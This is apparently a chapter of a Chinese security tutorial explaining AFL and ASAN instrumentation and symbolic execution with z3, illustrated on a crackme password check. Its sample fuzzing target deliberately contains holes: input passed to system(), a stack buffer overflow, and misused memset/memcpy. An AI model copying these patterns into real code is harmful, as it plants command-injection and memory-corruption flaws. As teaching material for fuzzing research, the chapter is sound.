<p>讲述程序插桩这章,我们继续沿用第六章的示例代码来进行分析:</p>
<pre><code class="language-c">
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;


enum {
  MessageType_Hello = 0,
  MessageType_Execute,
  MessageType_Data
};

void execute_command(const unsigned char* command) {
    system(command);
}

void decrypt_data(const unsigned char* data_buffer,unsigned char data_buffer_length) {
    unsigned char* buffer[8] = {0};

    for (unsigned int data_index = 0;data_index &lt; data_buffer_length;++data_index)
        buffer[data_index] = data_buffer[data_index] ^ 0x65;

    printf(&quot;Recv:%s\n&quot;,&amp;buffer);
}

int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}

</code></pre>
<p>在此,如果我们要对这段代码进行Fuzzing ,那么Fuzzing 入口是<code>buffer_resolver()</code> ,如果要用libFuzzer 对它进行Fuzzing ,代码如下:</p>
<pre><code class="language-c++">
extern &quot;C&quot; int LLVMFuzzerTestOneInput(const unsigned char* data,unsigned int size) {
	return buffer_resolver(data);
}

</code></pre>
<p>这样对于Fuzzing buffer_resolver() 函数是一个简单粗暴的方法,那么AFL 对程序进行插桩的原理是怎么样的呢?我们先来分析一下程序执行图</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic13.png" alt="" /></p>
<p>可以看到,对于buffer[1] 的检查涵盖了三个判断语句,对于buffer[0] 的检查也涵盖了一个语句.那么要对程序进行插住分析,关键的一点是在函数入口点和函数内部的判读结构进行插桩,在此记录程序的执行状态.我们先来看看AFL 的实现:</p>
<pre><code class="language-c">
static const u8* trampoline_fmt_32 =
  &quot;\n&quot;
  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;
  &quot;\n&quot;
  &quot;.align 4\n&quot;
  &quot;\n&quot;
  &quot;leal -16(%%esp), %%esp\n&quot;
  &quot;movl %%edi,  0(%%esp)\n&quot;    //  movl 的意思刚好和mov 相反,是edi 赋值给(esp + 0) 而不是esp 赋值给edi
  &quot;movl %%edx,  4(%%esp)\n&quot;
  &quot;movl %%ecx,  8(%%esp)\n&quot;
  &quot;movl %%eax, 12(%%esp)\n&quot;
  &quot;movl $0x%08x, %%ecx\n&quot;      //  这里填充的数字是当前代码块的id
  &quot;call __afl_maybe_log\n&quot;
  &quot;movl 12(%%esp), %%eax\n&quot;
  &quot;movl  8(%%esp), %%ecx\n&quot;
  &quot;movl  4(%%esp), %%edx\n&quot;
  &quot;movl  0(%%esp), %%edi\n&quot;
  &quot;leal 16(%%esp), %%esp\n&quot;
  &quot;\n&quot;
  &quot;/* --- END --- */\n&quot;
  &quot;\n&quot;;

//  省略多余代码

static void add_instrumentation(void) {  //  AFL instrutment code in /afl-as.c:221
	///  ....

	  if (line[1] == 'j' &amp;&amp; line[2] != 'm' &amp;&amp; R(100) &lt; inst_ratio) {  //  TIPS!
	    //  not jmp ,is jnz jz jq jng ...
	    printf(&quot;insert code -- line=%s inst_ratio=%d \n&quot;,line,inst_ratio);
	    fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,
	            R(MAP_SIZE));

	    ins_lines++;
      }

    ///  ....
}

</code></pre>
<p>注释TIPS 中的判断,指的是遍历gcc 编译的.S 文件(afl 的插桩原理是通过GCC 在汇编阶段中调用as 命令来进行汇编,然后在获取到程序代码编译之后的/S 文件来进行逐行解析指令内容)中的指令是不是jz /jnz /jg 这些指令(也就是除了jmp 之外的跳转指令),然后在此下方插入插桩代码.<code>trampoline_fmt_32</code> 的代码是指,获取EDI EDX ECX EAX 的值保存到栈中,然后传递给<code>__afl_maybe_log()</code> 保存执行记录.我们把示例函数用clang 和afl-clang 编译,然后在IDA 上观察.</p>
<p>Clang 编译的结果:</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic7.png" alt="" /></p>
<p>afl-clang 的编译结果(注意,RCX 中保存的是当前块的ID ):</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic6.png" alt="" /></p>
<p>可以看到,用afl-clang 编译出来的二进制程序在条件判断跳转指令的下方插入了获取寄存器信息的记录代码,我们再来看看<code>__afl_maybe_log()</code> 函数的源码:</p>
<pre><code class="language-c">
static const u8* main_payload_32 =

  &quot;\n&quot;
  &quot;/* --- AFL MAIN PAYLOAD (32-BIT) --- */\n&quot;
  &quot;\n&quot;
  &quot;.text\n&quot;
  &quot;.att_syntax\n&quot;
  &quot;.code32\n&quot;
  &quot;.align 8\n&quot;
  &quot;\n&quot;

  &quot;__afl_maybe_log:\n&quot;  //  __afl_maybe_log() 函数入口点
  &quot;\n&quot;
  &quot;  lahf\n&quot;
  &quot;  seto %al\n&quot;
  &quot;\n&quot;
  &quot;  /* Check if SHM region is already mapped. */\n&quot;
  &quot;\n&quot;
  &quot;  movl  __afl_area_ptr, %edx\n&quot;  //  获取__afl_area_ptr 指针
  &quot;  testl %edx, %edx\n&quot;
  &quot;  je    __afl_setup\n&quot;   //  判断获取__afl_area_ptr 是否为空,如果为空就调用__afl_setup 初始化
  &quot;\n&quot;
  &quot;__afl_store:\n&quot;      //  __afl_store() 函数入口点
  &quot;\n&quot;
  &quot;  /* Calculate and store hit for the code location specified in ecx. There\n&quot;
  &quot;     is a double-XOR way of doing this without tainting another register,\n&quot;
  &quot;     and we use it on 64-bit systems; but it's slower for 32-bit ones. */\n&quot;
  &quot;\n&quot;
#ifndef COVERAGE_ONLY
  &quot;  movl __afl_prev_loc, %edi\n&quot;  //  获取__afl_prev_loc 的数据,这里保存的之前执行的代码路径记录
  &quot;  xorl %ecx, %edi\n&quot;            //  把当前执行到的代码块位置和__afl_prev_loc 的结果进行运算
  &quot;  shrl $1, %ecx\n&quot;              //
  &quot;  movl %ecx, __afl_prev_loc\n&quot;  //  保存结果到__afl_prev_loc ,它的意义在于,当我们执行不同的分支路径,通过对这些代码块的id 进行位运算来识别当前程序是不是相同的执行路径
#else
  &quot;  movl %ecx, %edi\n&quot;
#endif /* ^!COVERAGE_ONLY */
  &quot;\n&quot;
#ifdef SKIP_COUNTS
  &quot;  orb  $1, (%edx, %edi, 1)\n&quot;
#else
  &quot;  incb (%edx, %edi, 1)\n&quot;
#endif /* ^SKIP_COUNTS */
  &quot;\n&quot;
  &quot;__afl_return:\n&quot;
  &quot;\n&quot;
  &quot;  addb $127, %al\n&quot;
  &quot;  sahf\n&quot;
  &quot;  ret\n&quot;  //  退出__afl_maybe_log
  &quot;\n&quot;
  &quot;.align 8\n&quot;

</code></pre>
<p>所以,每次当代码执行到这个路径中的代码块的位置时,AFL 在程序中插桩的代码都可以检测到具体执行到的代码位置并计算执行路径.在对程序进行Fuzzing 的一个重要指标就是代码覆盖率,你的Fuzzing 策略和变异的数据可以触发更多的代码路径,那么就更能够发现隐藏的漏洞.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic8.png" alt="" /></p>
<p>从图中可以明白,如果测试样本只能覆盖Iteration1 和Iteration2 的话,那么Program 下除此之外位置的代码都是无法被执行到的,假定现在有5 个漏洞,以目前能Fuzzing 的代码覆盖率只能检测到3 个漏洞,另外2 个漏洞无法被检测出来,前面几章一直强调提高代码覆盖率的意义就在此.</p>
<p>程序插桩除了检测代码覆盖率之外,也可以对指针越界进行检查,我们以ASAN 为例子,这是一段示例代码:</p>
<pre><code class="language-c">
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;

int main(int argv,char** argc) {
        char* buffer = (char*)malloc(10);

        *(int *)&amp;buffer[4] = 0xAAAAAAAA;
        free(buffer);

        return 0;
}

</code></pre>
<p>在不启用ASAN 的情况下编译,LLVM IR 代码如下:</p>
<pre><code class="language-llvm">
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = call i8* @malloc(i64 10) #3               #  从malloc() 中分配内存
  store i8* %7, i8** %6, align 8
  %8 = load i8*, i8** %6, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 4  #  获取数组位置
  %10 = bitcast i8* %9 to i32*                   #  转换1 字节数组成4 字节
  store i32 -1431655766, i32* %10, align 4       #  保存数据到这里
  %11 = load i8*, i8** %6, align 8
  call void @free(i8* %11)
  ret i32 0
}

</code></pre>
<p>在启用ASAN 的情况下编译,LLVM IR 代码如下:</p>
<pre><code class="language-llvm">
define i32 @main(i32 %argv, i8** %argc) #0 {
  %retval = alloca i32, align 4
  %argv.addr = alloca i32, align 4
  %argc.addr = alloca i8**, align 8
  %buffer = alloca i8*, align 8
  store i32 0, i32* %retval, align 4
  store i32 %argv, i32* %argv.addr, align 4
  store i8** %argc, i8*** %argc.addr, align 8
  %1 = bitcast i8** %buffer to i8*
  call void @llvm.lifetime.start.p0i8(i64 8, i8* %1) #4
  %call = call i8* @malloc(i64 10) #5                     #  从malloc() 中分配内存
  store i8* %call, i8** %buffer, align 8
  %2 = load i8*, i8** %buffer, align 8
  %arrayidx = getelementptr inbounds i8, i8* %2, i64 4    #  获取数组第四个元素
  %3 = bitcast i8* %arrayidx to i32*                      #  转换1 字节数组成4 字节
                                                          #  /-- AddressSanitizer::instrumentAddress()
  %4 = ptrtoint i32* %3 to i64                            #  |  获取数组地址对应内容
                                                          #  |--/-- AddressSanitizer::memToShadow()
  %5 = lshr i64 %4, 3                                     #  |  |
  %6 = or i64 %5, 17592186044416                          #  |  |  计算数组在Shadow 表中的位置
                                                          #  |--\-- AddressSanitizer::memToShadow()
  %7 = inttoptr i64 %6 to i8*                             #  |  计算Shadow 表中的数据指针位置
  %8 = load i8, i8* %7                                    #  |  从Shadow 表中获取数据
  %9 = icmp ne i8 %8, 0                                   #  |  判断指针是否为空
  br i1 %9, label %10, label %16, !prof !3                #  |  判断跳转
                                                          #  |
; &lt;label&gt;:10:                                     ; preds = %0
                                                          #  |--/-- AddressSanitizer::createSlowPathCmp()
  %11 = and i64 %4, 7                                     #  |  |  (1 &lt;&lt; kDefaultShadowScale) - 1
  %12 = add i64 %11, 3                                    #  |  |  计算写入数据的指针位置
  %13 = trunc i64 %12 to i8                               #  |  |
  %14 = icmp sge i8 %13, %8                               #  |  |  判断是否越界,这个是&gt;= 判断,对比写入数据指针是否超过了Buffer 的上标界限
                                                          #  |--\-- AddressSanitizer::createSlowPathCmp()
  br i1 %14, label %15, label %16                         #  |

; &lt;label&gt;:15:                                     ; preds = %10
                                                          #  |--/-- AddressSanitizer::generateCrashCode(）
  call void @__asan_report_store4(i64 %4)                 #  |  |  显示ASAN 报告详细错误
  call void asm sideeffect &quot;&quot;, &quot;&quot;()                       #  |  |
  unreachable                                             #  |  |
                                                          #  |--\-- AddressSanitizer::generateCrashCode()
                                                          #  \-- AddressSanitizer::instrumentAddress()

; &lt;label&gt;:16:                                     ; preds = %10, %0
  store i32 -1431655766, i32* %3, align 4
  %17 = load i8*, i8** %buffer, align 8
  call void @free(i8* %17)
  %18 = bitcast i8** %buffer to i8*
  call void @llvm.lifetime.end.p0i8(i64 8, i8* %18) #4
  ret i32 0
}

</code></pre>
<p>ASAN 的代码插桩逻辑代码如下:</p>
<pre><code class="language-c++">
Value *AddressSanitizer::createSlowPathCmp(IRBuilder&lt;&gt; &amp;IRB, Value *AddrLong,
                                           Value *ShadowValue,
                                           uint32_t TypeSize) {
  size_t Granularity = static_cast&lt;size_t&gt;(1) &lt;&lt; Mapping.Scale;
  // Addr &amp; (Granularity - 1)
  Value *LastAccessedByte =
      IRB.CreateAnd(AddrLong, ConstantInt::get(IntptrTy, Granularity - 1));
  // (Addr &amp; (Granularity - 1)) + size - 1
  if (TypeSize / 8 &gt; 1)
    LastAccessedByte = IRB.CreateAdd(
        LastAccessedByte, ConstantInt::get(IntptrTy, TypeSize / 8 - 1));
  // (uint8_t) ((Addr &amp; (Granularity-1)) + size - 1)
  LastAccessedByte =
      IRB.CreateIntCast(LastAccessedByte, ShadowValue-&gt;getType(), false);
  // ((uint8_t) ((Addr &amp; (Granularity-1)) + size - 1)) &gt;= ShadowValue
  return IRB.CreateICmpSGE(LastAccessedByte, ShadowValue);
}

Value *AddressSanitizer::memToShadow(Value *Shadow, IRBuilder&lt;&gt; &amp;IRB) {  //  计算Shadow 表位置
  // Shadow &gt;&gt; scale
  Shadow = IRB.CreateLShr(Shadow, Mapping.Scale);  //  插入LShr 指令
  if (Mapping.Offset == 0) return Shadow;
  // (Shadow &gt;&gt; scale) | offset
  Value *ShadowBase;                          //  计算Shadow 表的基地址
  if (LocalDynamicShadow)
    ShadowBase = LocalDynamicShadow;
  else
    ShadowBase = ConstantInt::get(IntptrTy, Mapping.Offset);  //  kDefaultShadowOffset64 = 1ULL &lt;&lt; 44;
  if (Mapping.OrShadowOffset)
    return IRB.CreateOr(Shadow, ShadowBase);  //  插入Or 指令
  else
    return IRB.CreateAdd(Shadow, ShadowBase);
}

void AddressSanitizer::instrumentAddress(Instruction *OrigIns,
                                         Instruction *InsertBefore, Value *Addr,
                                         uint32_t TypeSize, bool IsWrite,
                                         Value *SizeArgument, bool UseCalls,
                                         uint32_t Exp) {  //  插桩逻辑函数
  IRBuilder&lt;&gt; IRB(InsertBefore);
  Value *AddrLong = IRB.CreatePointerCast(Addr, IntptrTy);  //  获取buffer 指针位置
  size_t AccessSizeIndex = TypeSizeToSizeIndex(TypeSize);   //  计算访问内存的大小

  if (UseCalls) {  //  UseCalls 的方式是指在不插桩下直接调用ASAN 内部函数进行检测
    if (Exp == 0)
      IRB.CreateCall(AsanMemoryAccessCallback[IsWrite][0][AccessSizeIndex],
                     AddrLong);
    else
      IRB.CreateCall(AsanMemoryAccessCallback[IsWrite][1][AccessSizeIndex],
                     {AddrLong, ConstantInt::get(IRB.getInt32Ty(), Exp)});
    return;
  }

  Type *ShadowTy =
      IntegerType::get(*C, std::max(8U, TypeSize &gt;&gt; Mapping.Scale));  //  kDefaultShadowScale = 3
  Type *ShadowPtrTy = PointerType::get(ShadowTy, 0);
  Value *ShadowPtr = memToShadow(AddrLong, IRB);  //  计算buffer 在Shadow 表中的位置
  Value *CmpVal = Constant::getNullValue(ShadowTy);
  Value *ShadowValue =
      IRB.CreateLoad(IRB.CreateIntToPtr(ShadowPtr, ShadowPtrTy));  //  从Shadow 表中加载数据

  Value *Cmp = IRB.CreateICmpNE(ShadowValue, CmpVal);  //  构造判断语句
  size_t Granularity = 1ULL &lt;&lt; Mapping.Scale;
  Instruction *CrashTerm = nullptr;

  if (ClAlwaysSlowPath || (TypeSize &lt; 8 * Granularity)) {
    // We use branch weights for the slow path check, to indicate that the slow
    // path is rarely taken. This seems to be the case for SPEC benchmarks.
    Instruction *CheckTerm = SplitBlockAndInsertIfThen(
        Cmp, InsertBefore, false, MDBuilder(*C).createBranchWeights(1, 100000));  //  为前面的cmp 判断创建分支代码块
    assert(cast&lt;BranchInst&gt;(CheckTerm)-&gt;isUnconditional());
    BasicBlock *NextBB = CheckTerm-&gt;getSuccessor(0);
    IRB.SetInsertPoint(CheckTerm);
    Value *Cmp2 = createSlowPathCmp(IRB, AddrLong, ShadowValue, TypeSize);
    if (Recover) {
      CrashTerm = SplitBlockAndInsertIfThen(Cmp2, CheckTerm, false);
    } else {
      BasicBlock *CrashBlock =
        BasicBlock::Create(*C, &quot;&quot;, NextBB-&gt;getParent(), NextBB);
      CrashTerm = new UnreachableInst(*C, CrashBlock);
      BranchInst *NewTerm = BranchInst::Create(CrashBlock, NextBB, Cmp2);
      ReplaceInstWithInst(CheckTerm, NewTerm);
    }
  } else {
    CrashTerm = SplitBlockAndInsertIfThen(Cmp, InsertBefore, !Recover);
  }

  Instruction *Crash = generateCrashCode(CrashTerm, AddrLong, IsWrite,
                                         AccessSizeIndex, SizeArgument, Exp);
  Crash-&gt;setDebugLoc(OrigIns-&gt;getDebugLoc());
}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="符号执行-1"><a class="header" href="#符号执行-1">符号执行</a></h2>
<p>符号执行是指把程序的语义抽象变成逻辑公式或代码路径公式,通过对这条公式进行求解并得出符合的条件.第六章的综合分析中提到,当我们在检测可控的输入是否能够通过某些特定的判断语句达到触发点,需要满足哪些条件并进行求解,这是静态符号执行.动态符号执行的原理是跟踪程序的执行,在某些特定的判断和数据运算的过程中可以知道具体的内容值(在静态符号执行中有时候不容易获取某一行代码或者汇编的值,所以需要跟踪到此获得该值,而且静态符号执行在对非常多的条件进行求解的时候会产生路径爆炸的问题,又需要考虑条件优化)然后构建逻辑公式进行路径/数据求解.我们先研究这段代码:</p>
<pre><code class="language-assembly">
mov eax, 1
add eax, 2
mov ebx, eax

</code></pre>
<p>对应到寄存器布局如下:</p>
<pre><code class="language-txt">
EAX : -1
EBX : -1
ECX : -1

</code></pre>
<p>然后我们模拟执行这段汇编代码并填写寄存器布局,过程如下:</p>
<pre><code class="language-txt">
(Round 1)

Code :

mov eax, 1     &lt;- Point
add eax, 2
mov ebx, eax

Symbolic Expression :

p0 = 1

Register Reference Table :

EAX : p0
EBX : -1
ECX : -1

----

(Round 2)

Code :

mov eax, 1
add eax, 2     &lt;- Point
mov ebx, eax

Symbolic Expression :

p0 = 1
p1 = add(p0,2)

Register Reference Table :

EAX : p1
EBX : -1
ECX : -1

----

(Round 3)

Code :

mov eax, 1
add eax, 2
mov ebx, eax   &lt;- Point

Symbolic Expression :

p0 = 1
p1 = add(p0,2)
p2 = p1

Register Reference Table :

EAX : p1
EBX : p2
ECX : -1

</code></pre>
<p>然后我们要求解EBX 寄存器的值,只需要把公式组装即可:</p>
<pre><code class="language-txt">
EBX = p2 , p2 = p1 = add(p0,2) = add(1,2) = 3

</code></pre>
<p>我们举一个对内存数据进行运算的例子</p>
<pre><code class="language-c">
char *serial = &quot;\x31\x3e\x3d\x26\x31&quot;;

int check_password(char *ptr)
{
  int i = 0;
  while (i &lt; 5){
    if (((ptr[i] - 1) ^ 0x55) != serial[i])
      return 1; /* bad password */
    i++;
  }
  return 0; /* good password */
}

</code></pre>
<p>对应的汇编如下:</p>
<pre><code class="language-assembly">
__text:0000000100000F20                 public _check_password
__text:0000000100000F20 _check_password proc near
__text:0000000100000F20
__text:0000000100000F20 var_14          = dword ptr -14h
__text:0000000100000F20 var_10          = qword ptr -10h
__text:0000000100000F20 var_4           = dword ptr -4
__text:0000000100000F20
__text:0000000100000F20                 push    rbp
__text:0000000100000F21                 mov     rbp, rsp
__text:0000000100000F24                 mov     [rbp+var_10], rdi
__text:0000000100000F28                 mov     [rbp+var_14], 0
__text:0000000100000F2F
__text:0000000100000F2F loc_100000F2F:                          ; CODE XREF: _check_password+57↓j
__text:0000000100000F2F                 cmp     [rbp+var_14], 5
__text:0000000100000F33                 jge     loc_100000F7C
__text:0000000100000F39                 mov     rax, [rbp+var_10]
__text:0000000100000F3D                 movsxd  rcx, [rbp+var_14]
__text:0000000100000F41                 movsx   edx, byte ptr [rax+rcx]
__text:0000000100000F45                 sub     edx, 1
__text:0000000100000F48                 xor     edx, 55h
__text:0000000100000F4B                 mov     rax, cs:_serial
__text:0000000100000F52                 movsxd  rcx, [rbp+var_14]
__text:0000000100000F56                 movsx   esi, byte ptr [rax+rcx]
__text:0000000100000F5A                 cmp     edx, esi
__text:0000000100000F5C                 jz      loc_100000F6E
__text:0000000100000F62                 mov     [rbp+var_4], 1
__text:0000000100000F69                 jmp     loc_100000F83
__text:0000000100000F6E ; ---------------------------------------------------------------------------
__text:0000000100000F6E
__text:0000000100000F6E loc_100000F6E:                          ; CODE XREF: _check_password+3C↑j
__text:0000000100000F6E                 mov     eax, [rbp+var_14]
__text:0000000100000F71                 add     eax, 1
__text:0000000100000F74                 mov     [rbp+var_14], eax
__text:0000000100000F77                 jmp     loc_100000F2F
__text:0000000100000F7C ; ---------------------------------------------------------------------------
__text:0000000100000F7C
__text:0000000100000F7C loc_100000F7C:                          ; CODE XREF: _check_password+13↑j
__text:0000000100000F7C                 mov     [rbp+var_4], 0
__text:0000000100000F83
__text:0000000100000F83 loc_100000F83:                          ; CODE XREF: _check_password+49↑j
__text:0000000100000F83                 mov     eax, [rbp+var_4]
__text:0000000100000F86                 pop     rbp
__text:0000000100000F87                 retn

</code></pre>
<p>我们知道,<code>_check_password()</code> 的字符串地址参数保存在rdi 寄存器中,然后<code>mov rax, [rbp+var_10]</code>和<code>movsx edx, byte ptr [rax+rcx]</code> 两句汇编从字符串缓冲区中读取字符出来,在<code>xor edx, 55h</code> 进行异或运算,最后使用<code>cmp edx, esi</code> 和程序中内置的字符串进行字符值判断,<code>jz loc_100000F6E</code> 的意思是如果两值不相等那就跳转到地址0x100000F83 ,不相等就执行到0x100000F6E 的jmp 指令跳转到0x100000F2F 处(这是for 循环结构).<code>_check_password()</code> 在校验异或过后的字符失败就会返回1 ,成功则返回0 .</p>
<p>理解这段汇编代码之后,我们就对代码进行一步一步的符号执行分析.我们先抽出最核心的运算代码:</p>
<pre><code class="language-assembly">
__text:0000000100000F39                 mov     rax, [rbp+var_10]
__text:0000000100000F3D                 movsxd  rcx, [rbp+var_14]
__text:0000000100000F41                 movsx   edx, byte ptr [rax+rcx]
__text:0000000100000F45                 sub     edx, 1
__text:0000000100000F48                 xor     edx, 55h
__text:0000000100000F4B                 mov     rax, cs:_serial
__text:0000000100000F52                 movsxd  rcx, [rbp+var_14]
__text:0000000100000F56                 movsx   esi, byte ptr [rax+rcx]
__text:0000000100000F5A                 cmp     edx, esi

</code></pre>
<p>然后对这段代码进行寄存器布局.</p>
<pre><code class="language-txt">
(Round 1)

Code :

mov     rax, [rbp+var_10]         &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10

Register Reference Table :

RAX : p0
RBX : -1
RCX : -1
RDX : -1
RSI : -1
RDI : -1

----

(Round 2)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14

Register Reference Table :

RAX : p0
RBX : -1
RCX : p1
RDX : -1
RSI : -1
RDI : -1

----

(Round 3)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]   &lt;- Point
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)

Register Reference Table :

RAX : p0
RBX : -1
RCX : p1
RDX : p2
RSI : -1
RDI : -1

----

(Round 4)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1                    &lt;- Point
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)

Register Reference Table :

RAX : p0
RBX : -1
RCX : p1
RDX : p3
RSI : -1
RDI : -1

----

(Round 5)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h                  &lt;- Point
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)

Register Reference Table :

RAX : p0
RBX : -1
RCX : p1
RDX : p4
RSI : -1
RDI : -1

----

(Round 6)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial           &lt;- Point
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial

Register Reference Table :

RAX : p5
RBX : -1
RCX : p1
RDX : p4
RSI : -1
RDI : -1

----

(Round 7)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]         &lt;- Point
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial
p6 = var_14

Register Reference Table :

RAX : p5
RBX : -1
RCX : p6
RDX : p4
RSI : -1
RDI : -1

----

(Round 8)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]   &lt;- Point
cmp     edx, esi

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial
p6 = var_14
p7 = *(add(p5,p6))

Register Reference Table :

RAX : p5
RBX : -1
RCX : p6
RDX : p4
RSI : p7
RDI : -1

----

(Round 9)

Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi                  &lt;- Point

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial
p6 = var_14
p7 = *(add(p5,p6))

Register Reference Table :

RAX : p5
RBX : -1
RCX : p6
RDX : p4
RSI : p7
RDI : -1

</code></pre>
<p>在执行到第九步时,指令<code>cmp edx, esi</code> 会把edx 和esi 的值进行对比,于是我们根据寄存器布局来构造求解公式:</p>
<pre><code class="language-txt">
RDX = p4 = xor(p3,0x55) = xor(sub(p2,1),0x55) = xor(sub(*(add(p0,p1),1),0x55)) = xor(sub(*(add(var_10,var_14),1),0x55))
RSI = p7 = *(add(p5,p6)) = *(add(_serial,var_14))

(RDX == RSI) =&gt; (xor(sub(*(add(var_10,var_14),1),0x55)) == *(add(_serial,var_14)))

</code></pre>
<p>在此先忽略<code>*(add(var_10,var_14)</code> 和<code>*(add(_serial,var_14)))</code> ,因为这是获取内存,后面再讨论.我们先假定一个未知值X (可控输入)和已知值(_serial 中的字符值)进行公式重组,约束如下.</p>
<pre><code class="language-txt">
(RDX == RSI) =&gt; (xor(sub(X,1),0x55) == 0x31)

</code></pre>
<p>用z3 求解方式的代码:</p>
<pre><code class="language-python">
from z3 import *


x = BitVec('x',8)
solver = Solver()

solver.add((x - 1) ^ 0x55 == 0x31)
solver.check()

print solver.model()

</code></pre>
<p>执行结果如下:</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic3.png" alt="" /></p>
<p>在对寄存器求解的过程中,我们发现var_10,var_14,_serial 都是从内存中获取到的数据,但是具体数据是什么我们不得而知,所以还需要对进行内存布局,再进行求解</p>
<pre><code class="language-txt">
Code :

mov     rax, [rbp+var_10]
movsxd  rcx, [rbp+var_14]
movsx   edx, byte ptr [rax+rcx]
sub     edx, 1
xor     edx, 55h
mov     rax, cs:_serial
movsxd  rcx, [rbp+var_14]
movsx   esi, byte ptr [rax+rcx]
cmp     edx, esi                  &lt;- Point

Symbolic Expression :

p0 = var_10
p1 = var_14
p2 = *(add(p0,p1)) (control)
p3 = sub(p2,1)
p4 = xor(p3,0x55)
p5 = _serial
p6 = var_14
p7 = *(add(p5,p6))

Register Reference Table :

RAX : p5
RBX : -1
RCX : p6
RDX : p4
RSI : p7
RDI : -1

Memory Reference Table :

var_14         : 0  #  假定为0
var_10_buffer  : [ -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 ]  #  未初始化为-1
